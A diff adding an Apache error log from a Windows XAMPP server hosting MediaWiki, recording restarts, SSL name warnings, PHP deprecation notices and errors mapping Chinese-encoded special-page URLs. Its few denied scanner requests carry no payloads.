@@ -1,0 +1,519 @@
+[Fri Apr 22 01:20:46.025934 2022] [ssl:warn] [pid 5460:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 01:20:46.060106 2022] [ssl:warn] [pid 5460:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 01:20:46.097220 2022] [mpm_winnt:notice] [pid 5460:tid 576] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 01:20:46.097220 2022] [mpm_winnt:notice] [pid 5460:tid 576] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 01:20:46.097220 2022] [core:notice] [pid 5460:tid 576] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 01:20:46.101119 2022] [mpm_winnt:notice] [pid 5460:tid 576] AH00418: Parent: Created child process 4304
+[Fri Apr 22 01:20:46.377491 2022] [ssl:warn] [pid 4304:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 01:20:46.407761 2022] [ssl:warn] [pid 4304:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 01:20:46.430215 2022] [mpm_winnt:notice] [pid 4304:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 01:45:20.616351 2022] [mpm_winnt:notice] [pid 5460:tid 576] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 01:45:22.617807 2022] [mpm_winnt:notice] [pid 4304:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 01:45:23.055812 2022] [mpm_winnt:notice] [pid 5460:tid 576] AH00430: Parent: Child process 4304 exited successfully.
+[Fri Apr 22 01:45:24.713034 2022] [ssl:warn] [pid 4464:tid 588] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 01:45:24.746241 2022] [ssl:warn] [pid 4464:tid 588] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 01:45:24.775528 2022] [mpm_winnt:notice] [pid 4464:tid 588] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 01:45:24.775528 2022] [mpm_winnt:notice] [pid 4464:tid 588] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 01:45:24.775528 2022] [core:notice] [pid 4464:tid 588] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 01:45:24.777980 2022] [mpm_winnt:notice] [pid 4464:tid 588] AH00418: Parent: Created child process 6836
+[Fri Apr 22 01:45:25.071930 2022] [ssl:warn] [pid 6836:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 01:45:25.104640 2022] [ssl:warn] [pid 6836:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 01:45:25.129052 2022] [mpm_winnt:notice] [pid 6836:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 01:47:38.565359 2022] [mpm_winnt:notice] [pid 4464:tid 588] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 01:47:40.567802 2022] [mpm_winnt:notice] [pid 6836:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 01:47:40.859306 2022] [mpm_winnt:notice] [pid 4464:tid 588] AH00430: Parent: Child process 6836 exited successfully.
+[Fri Apr 22 01:48:54.413063 2022] [ssl:warn] [pid 7940:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 01:48:54.446262 2022] [ssl:warn] [pid 7940:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 01:48:54.527797 2022] [mpm_winnt:notice] [pid 7940:tid 576] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 01:48:54.527797 2022] [mpm_winnt:notice] [pid 7940:tid 576] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 01:48:54.527797 2022] [core:notice] [pid 7940:tid 576] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 01:48:54.529757 2022] [mpm_winnt:notice] [pid 7940:tid 576] AH00418: Parent: Created child process 5188
+[Fri Apr 22 01:48:54.818348 2022] [ssl:warn] [pid 5188:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 01:48:54.851536 2022] [ssl:warn] [pid 5188:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 01:48:54.912081 2022] [mpm_winnt:notice] [pid 5188:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 01:49:02.965303 2022] [php7:notice] [pid 5188:tid 1836] [client 127.0.0.1:51179] PHP Deprecated:  Premature access to service container [Called from TemplateParser::getTemplate in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\TemplateParser.php at line 120] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 375, referer: http://localhost/
+[Fri Apr 22 01:49:06.649398 2022] [php7:notice] [pid 5188:tid 1836] [client 127.0.0.1:51179] PHP Deprecated:  Premature access to service 'HookContainer' [Called from MediaWiki\\MediaWikiServices::getInstance in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\MediaWikiServices.php at line 267] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 375, referer: http://localhost/
+[Fri Apr 22 01:49:06.727023 2022] [php7:notice] [pid 5188:tid 1836] [client 127.0.0.1:51179] PHP Deprecated:  Premature access to service 'ObjectFactory' [Called from Wikimedia\\Services\\ServiceContainer::{closure} in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\ServiceWiring.php at line 618] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 375, referer: http://localhost/
+[Fri Apr 22 01:49:06.743624 2022] [php7:notice] [pid 5188:tid 1836] [client 127.0.0.1:51179] PHP Deprecated:  Premature access to service 'MainConfig' [Called from TemplateParser::getTemplate in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\TemplateParser.php at line 120] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 375, referer: http://localhost/
+[Fri Apr 22 01:49:06.744613 2022] [php7:notice] [pid 5188:tid 1836] [client 127.0.0.1:51179] PHP Deprecated:  Premature access to service 'ConfigFactory' [Called from Wikimedia\\Services\\ServiceContainer::{closure} in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\ServiceWiring.php at line 827] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 375, referer: http://localhost/
+[Fri Apr 22 01:49:06.744613 2022] [php7:notice] [pid 5188:tid 1836] [client 127.0.0.1:51179] PHP Deprecated:  Premature access to service 'BootstrapConfig' [Called from Wikimedia\\Services\\ServiceContainer::{closure} in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\ServiceWiring.php at line 346] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 375, referer: http://localhost/
+[Fri Apr 22 01:49:07.012674 2022] [php7:notice] [pid 5188:tid 1836] [client 127.0.0.1:51179] PHP Deprecated:  Premature access to service 'LocalServerObjectCache' [Called from ObjectCache::getLocalServerInstance in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\objectcache\\ObjectCache.php at line 256] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 375, referer: http://localhost/
+[Fri Apr 22 01:49:07.090801 2022] [php7:notice] [pid 5188:tid 1836] [client 127.0.0.1:51179] PHP Deprecated:  Premature access to service 'StatsdDataFactory' [Called from ObjectCache::newFromParams in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\objectcache\\ObjectCache.php at line 149] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 375, referer: http://localhost/
+[Fri Apr 22 02:02:25.115911 2022] [core:error] [pid 5188:tid 1792] (20024)The given path is misformatted or contained invalid characters: [client 127.0.0.1:51766] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95 HTTP/1.1 to file, referer: http://localhost/mediawiki/index.php
+[Fri Apr 22 02:02:31.341491 2022] [core:error] [pid 5188:tid 1836] (20024)The given path is misformatted or contained invalid characters: [client 127.0.0.1:51747] AH00127: Cannot map POST /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95 HTTP/1.1 to file, referer: http://localhost/mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95
+[Fri Apr 22 02:24:27.299006 2022] [authz_core:error] [pid 5188:tid 1800] [client 83.97.20.34:40857] AH01630: client denied by server configuration: C:/xamppp/htdocs/
+[Fri Apr 22 02:26:23.675996 2022] [php7:notice] [pid 5188:tid 1800] [client 127.0.0.1:52489] PHP Deprecated:  Use of BaseTemplate::getAfterPortlet was deprecated in MediaWiki 1.35. [Called from SplashTemplate::getPortlet in C:\\Users\\Administrator\\lox\\mediawiki\\skins\\Splash\\includes\\SplashTemplate.php at line 893] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 375
+[Fri Apr 22 02:27:14.428951 2022] [php7:notice] [pid 5188:tid 1804] [client 117.184.69.178:64524] PHP Deprecated:  Use of BaseTemplate::getAfterPortlet was deprecated in MediaWiki 1.35. [Called from SplashTemplate::getPortlet in C:\\Users\\Administrator\\lox\\mediawiki\\skins\\Splash\\includes\\SplashTemplate.php at line 893] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 375
+[Fri Apr 22 02:40:09.406594 2022] [php7:notice] [pid 5188:tid 1796] [client 175.27.65.200:56724] PHP Deprecated:  Use of BaseTemplate::getAfterPortlet was deprecated in MediaWiki 1.35. [Called from SplashTemplate::getPortlet in C:\\Users\\Administrator\\lox\\mediawiki\\skins\\Splash\\includes\\SplashTemplate.php at line 893] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 375
+[Fri Apr 22 02:42:31.722080 2022] [php7:notice] [pid 5188:tid 1792] [client 117.184.69.178:62208] PHP Deprecated:  Use of BaseTemplate::getAfterPortlet was deprecated in MediaWiki 1.35. [Called from SplashTemplate::getPortlet in C:\\Users\\Administrator\\lox\\mediawiki\\skins\\Splash\\includes\\SplashTemplate.php at line 893] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 375
+[Fri Apr 22 02:43:05.098539 2022] [php7:notice] [pid 5188:tid 1792] [client 117.184.69.178:62217] PHP Deprecated:  Use of BaseTemplate::getAfterPortlet was deprecated in MediaWiki 1.35. [Called from SplashTemplate::getPortlet in C:\\Users\\Administrator\\lox\\mediawiki\\skins\\Splash\\includes\\SplashTemplate.php at line 893] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 375
+[Fri Apr 22 02:47:13.390884 2022] [php7:notice] [pid 5188:tid 1792] [client 117.184.69.178:62469] PHP Deprecated:  Use of BaseTemplate::getAfterPortlet was deprecated in MediaWiki 1.35. [Called from SplashTemplate::getPortlet in C:\\Users\\Administrator\\lox\\mediawiki\\skins\\Splash\\includes\\SplashTemplate.php at line 893] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 375
+[Fri Apr 22 02:47:18.993398 2022] [php7:notice] [pid 5188:tid 1796] [client 117.184.69.178:62468] PHP Deprecated:  Use of BaseTemplate::getAfterPortlet was deprecated in MediaWiki 1.35. [Called from SplashTemplate::getPortlet in C:\\Users\\Administrator\\lox\\mediawiki\\skins\\Splash\\includes\\SplashTemplate.php at line 893] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 375
+[Fri Apr 22 02:47:53.500514 2022] [php7:notice] [pid 5188:tid 1796] [client 117.184.69.178:62491] PHP Deprecated:  Use of BaseTemplate::getAfterPortlet was deprecated in MediaWiki 1.35. [Called from SplashTemplate::getPortlet in C:\\Users\\Administrator\\lox\\mediawiki\\skins\\Splash\\includes\\SplashTemplate.php at line 893] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 375
+[Fri Apr 22 03:17:16.920926 2022] [php7:notice] [pid 5188:tid 1792] [client 117.184.69.178:55827] PHP Deprecated:  Use of BaseTemplate::getAfterPortlet was deprecated in MediaWiki 1.35. [Called from SplashTemplate::getPortlet in C:\\Users\\Administrator\\lox\\mediawiki\\skins\\Splash\\includes\\SplashTemplate.php at line 893] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 375
+[Fri Apr 22 03:22:28.752605 2022] [php7:notice] [pid 5188:tid 1792] [client 117.184.69.178:56996] PHP Notice:  Undefined variable: afterPortlet in C:\\Users\\Administrator\\lox\\mediawiki\\skins\\Splash\\includes\\SplashTemplate.php on line 893
+[Fri Apr 22 03:22:28.764319 2022] [php7:notice] [pid 5188:tid 1792] [client 117.184.69.178:56996] PHP Notice:  Undefined variable: afterPortlet in C:\\Users\\Administrator\\lox\\mediawiki\\skins\\Splash\\includes\\SplashTemplate.php on line 893
+[Fri Apr 22 03:30:43.302986 2022] [php7:notice] [pid 5188:tid 1792] [client 117.184.69.178:58968] PHP Deprecated:  Use of BaseTemplate::getAfterPortlet was deprecated in MediaWiki 1.35. [Called from SplashTemplate::getPortlet in C:\\Users\\Administrator\\lox\\mediawiki\\skins\\Splash\\includes\\SplashTemplate.php at line 893] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 375
+[Fri Apr 22 03:48:48.779586 2022] [authz_core:error] [pid 5188:tid 1792] [client 104.131.42.238:54082] AH01630: client denied by server configuration: C:/xamppp/htdocs/
+[Fri Apr 22 03:48:49.367479 2022] [authz_core:error] [pid 5188:tid 1792] [client 104.131.42.238:54082] AH01630: client denied by server configuration: C:/xamppp/htdocs/favicon.ico, referer: https://121.4.151.34/
+[Fri Apr 22 03:54:23.879069 2022] [core:error] [pid 5188:tid 1800] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:64641] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E5%8F%82%E6%95%B0%E8%AE%BE%E7%BD%AE HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 03:55:13.546085 2022] [core:error] [pid 5188:tid 1792] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:64834] AH00127: Cannot map POST /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E5%8F%82%E6%95%B0%E8%AE%BE%E7%BD%AE HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E5%8F%82%E6%95%B0%E8%AE%BE%E7%BD%AE
+[Fri Apr 22 03:56:14.191599 2022] [core:error] [pid 5188:tid 1792] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:65195] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E7%89%B9%E6%AE%8A%E9%A1%B5%E9%9D%A2 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 03:56:36.577343 2022] [core:error] [pid 5188:tid 1836] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:65269] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E5%B0%8F%E5%B7%A5%E5%85%B7 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E7%89%B9%E6%AE%8A%E9%A1%B5%E9%9D%A2
+[Fri Apr 22 03:56:42.931837 2022] [core:error] [pid 5188:tid 1808] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:65297] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E7%89%88%E6%9C%AC HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E7%89%B9%E6%AE%8A%E9%A1%B5%E9%9D%A2
+[Fri Apr 22 03:57:06.360558 2022] [core:error] [pid 5188:tid 1836] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:65383] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E5%B1%95%E5%BC%80%E6%A8%A1%E6%9D%BF HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E7%89%B9%E6%AE%8A%E9%A1%B5%E9%9D%A2
+[Fri Apr 22 03:57:08.631065 2022] [core:error] [pid 5188:tid 1836] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:65398] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%9B%BF%E6%8D%A2%E6%96%87%E6%9C%AC HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E7%89%B9%E6%AE%8A%E9%A1%B5%E9%9D%A2
+[Fri Apr 22 03:57:08.953347 2022] [php7:notice] [pid 5188:tid 1836] [client 117.184.69.178:65398] PHP Deprecated:  Use of MWNamespace::getSubject was deprecated in MediaWiki 1.34. [Called from MediaWiki\\Extension\\ReplaceText\\SpecialReplaceText::namespaceTables in C:\\Users\\Administrator\\lox\\mediawiki\\extensions\\ReplaceText\\src\\SpecialReplaceText.php at line 601] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 375, referer: http://121.4.151.34/mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E7%89%B9%E6%AE%8A%E9%A1%B5%E9%9D%A2
+[Fri Apr 22 03:57:11.259973 2022] [core:error] [pid 5188:tid 1804] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:65423] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%89%80%E6%9C%89%E4%BF%A1%E6%81%AF HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E7%89%B9%E6%AE%8A%E9%A1%B5%E9%9D%A2
+[Fri Apr 22 03:57:20.717978 2022] [core:error] [pid 5188:tid 1804] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:65470] AH00127: Cannot map GET /mediawiki/index.php/MediaWiki:Gadgets-definition HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E5%B0%8F%E5%B7%A5%E5%85%B7
+[Fri Apr 22 04:00:09.723876 2022] [authz_core:error] [pid 5188:tid 1808] [client 198.23.172.243:59502] AH01630: client denied by server configuration: C:/xamppp/htdocs/GponForm
+[Fri Apr 22 04:07:05.917339 2022] [authz_core:error] [pid 5188:tid 1836] [client 185.163.109.66:36698] AH01630: client denied by server configuration: C:/xamppp/htdocs/
+[Fri Apr 22 04:07:21.377305 2022] [authz_core:error] [pid 5188:tid 1836] [client 185.163.109.66:42890] AH01630: client denied by server configuration: C:/xamppp/htdocs/robots.txt
+[Fri Apr 22 04:07:22.537456 2022] [authz_core:error] [pid 5188:tid 1836] [client 185.163.109.66:43468] AH01630: client denied by server configuration: C:/xamppp/htdocs/sitemap.xml
+[Fri Apr 22 04:07:23.417339 2022] [authz_core:error] [pid 5188:tid 1836] [client 185.163.109.66:43942] AH01630: client denied by server configuration: C:/xamppp/htdocs/.well-known
+[Fri Apr 22 04:07:24.893902 2022] [authz_core:error] [pid 5188:tid 1836] [client 185.163.109.66:44566] AH01630: client denied by server configuration: C:/xamppp/htdocs/favicon.ico
+[Fri Apr 22 04:08:31.779670 2022] [core:error] [pid 5188:tid 1836] (20024)The given path is misformatted or contained invalid characters: [client 175.27.64.184:37652] AH00127: Cannot map GET /mediawiki/index.php/MediaWiki:Gadgets-definition HTTP/1.1 to file
+[Fri Apr 22 04:14:51.300962 2022] [core:error] [pid 5188:tid 1804] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:51973] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:EditPage/%E9%A6%96%E9%A1%B5 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 04:14:52.825371 2022] [core:error] [pid 5188:tid 1804] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:51988] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:EditPage/%E9%A6%96%E9%A1%B5 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 04:15:03.334172 2022] [core:error] [pid 5188:tid 1804] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:52051] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:ChangeContentModel/%E9%A6%96%E9%A1%B5 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 04:15:59.961139 2022] [core:error] [pid 5188:tid 1804] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:52236] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E7%89%B9%E6%AE%8A%E9%A1%B5%E9%9D%A2 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 04:16:35.802937 2022] [core:error] [pid 5188:tid 1804] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:52353] AH00127: Cannot map GET /mediawiki/index.php/MediaWiki:Evelution.css HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E7%89%B9%E6%AE%8A%E9%A1%B5%E9%9D%A2
+[Fri Apr 22 04:16:37.514851 2022] [core:error] [pid 5188:tid 1836] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:52361] AH00127: Cannot map GET /mediawiki/index.php/MediaWiki:Evelution.js HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E7%89%B9%E6%AE%8A%E9%A1%B5%E9%9D%A2
+[Fri Apr 22 04:16:53.862506 2022] [core:error] [pid 5188:tid 1836] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:52415] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E5%8F%82%E6%95%B0%E8%AE%BE%E7%BD%AE HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E7%89%B9%E6%AE%8A%E9%A1%B5%E9%9D%A2
+[Fri Apr 22 04:20:49.901629 2022] [core:error] [pid 5188:tid 1800] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:52759] AH00127: Cannot map GET //mediawiki/index.php/MediaWiki:Evelution.css HTTP/1.1 to file
+[Fri Apr 22 05:11:40.594120 2022] [core:error] [pid 5188:tid 1808] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:55791] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:PageInfo/%E9%A6%96%E9%A1%B5 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 05:15:06.192802 2022] [core:error] [pid 5188:tid 1792] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:55983] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E9%93%BE%E5%85%A5%E9%A1%B5%E9%9D%A2/%E9%A6%96%E9%A1%B5 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 05:15:07.812916 2022] [authz_core:error] [pid 5188:tid 1808] [client 64.227.78.19:55609] AH01630: client denied by server configuration: C:/xamppp/htdocs/
+[Fri Apr 22 05:20:31.303870 2022] [core:error] [pid 5188:tid 1792] (20024)The given path is misformatted or contained invalid characters: [client 119.147.3.78:58469] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E9%93%BE%E5%85%A5%E9%A1%B5%E9%9D%A2/%E9%A6%96%E9%A1%B5 HTTP/1.1 to file
+[Fri Apr 22 05:44:57.269236 2022] [core:error] [pid 5188:tid 1796] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:57808] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:EditPage/%E9%A6%96%E9%A1%B5 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 05:45:28.355177 2022] [core:error] [pid 5188:tid 1796] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:57854] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:EditPage/%E9%A6%96%E9%A1%B5 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 05:48:01.109084 2022] [core:error] [pid 5188:tid 1796] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:58074] AH00127: Cannot map GET /mediawiki/index.php/MediaWiki:Evelution.css HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php?title=%E9%A6%96%E9%A1%B5&action=edit
+[Fri Apr 22 05:49:48.584652 2022] [core:error] [pid 5188:tid 1796] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:58128] AH00127: Cannot map GET /mediawiki/index.php/MediaWiki:Evelution.css HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php?title=MediaWiki:Evelution.css&action=edit
+[Fri Apr 22 05:51:47.018247 2022] [core:error] [pid 5188:tid 1836] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:58962] AH00127: Cannot map GET /mediawiki/index.php/MediaWiki:Evelution.css HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php?title=MediaWiki:Evelution.css&action=edit
+[Fri Apr 22 05:52:46.830578 2022] [core:error] [pid 5188:tid 1836] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:59380] AH00127: Cannot map GET /mediawiki/index.php/MediaWiki:Evelution.css HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php?title=MediaWiki:Evelution.css&action=edit
+[Fri Apr 22 05:53:05.500398 2022] [core:error] [pid 5188:tid 1836] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:59494] AH00127: Cannot map GET /mediawiki/index.php/MediaWiki:Evelution.css HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php?title=MediaWiki:Evelution.css&action=edit
+[Fri Apr 22 05:53:20.942744 2022] [core:error] [pid 5188:tid 1836] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:59647] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%9C%80%E8%BF%91%E6%9B%B4%E6%94%B9 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 05:53:31.047222 2022] [core:error] [pid 5188:tid 1808] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:59725] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%9C%80%E8%BF%91%E6%9B%B4%E6%94%B9?hidebots=1&limit=50&days=7&enhanced=1&urlversion=2&peek=1&from=20220421215321&isAnon=false&action=render HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%9C%80%E8%BF%91%E6%9B%B4%E6%94%B9?hidebots=1&limit=50&days=7&enhanced=1&urlversion=2
+[Fri Apr 22 05:53:34.412345 2022] [core:error] [pid 5188:tid 1808] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:59741] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%9C%80%E8%BF%91%E6%9B%B4%E6%94%B9?hidebots=1&limit=50&days=7&enhanced=1&urlversion=2&peek=1&from=20220421215321&isAnon=false&action=render HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%9C%80%E8%BF%91%E6%9B%B4%E6%94%B9?hidebots=1&limit=50&days=7&enhanced=1&urlversion=2
+[Fri Apr 22 05:53:35.700430 2022] [core:error] [pid 5188:tid 1808] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:59750] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%96%B0%E5%BB%BA%E9%A1%B5%E9%9D%A2 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%9C%80%E8%BF%91%E6%9B%B4%E6%94%B9?hidebots=1&limit=50&days=7&enhanced=1&urlversion=2
